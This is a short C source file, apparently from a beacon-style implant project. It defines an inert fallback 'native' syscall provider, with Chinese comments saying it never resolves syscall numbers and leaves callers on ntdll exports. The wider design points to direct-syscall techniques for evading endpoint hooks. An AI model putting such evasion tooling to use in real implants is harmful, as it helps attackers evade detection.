#include "beacon_syscall.h"

/*
 * native.c -- 兜底 provider：不解析 SSN，直接调用 ntdll 导出（即现状）。
 *
 * ResolveNumber 恒返回 FALSE，因此永远不会"赢得"链上的解析；
 * 其语义是：解析失败时 callable 保持 NULL，SyscallBindApiTable 不触碰
 * Win32Api 槽位，调用方继续走 Win32ApiInit 解析出的 ntdll 导出地址。
 */

static BOOL NativeInit(VOID)
{
    return TRUE;
}

static BOOL NativeResolve(UINT32 func_id, PUINT32 ssn_out)
{
    (VOID)func_id;
    (VOID)ssn_out;
    return FALSE;
}

const SyscallProviderOps g_syscall_provider_native = {
    "native",
    NativeInit,
    NativeResolve,
    NULL
};
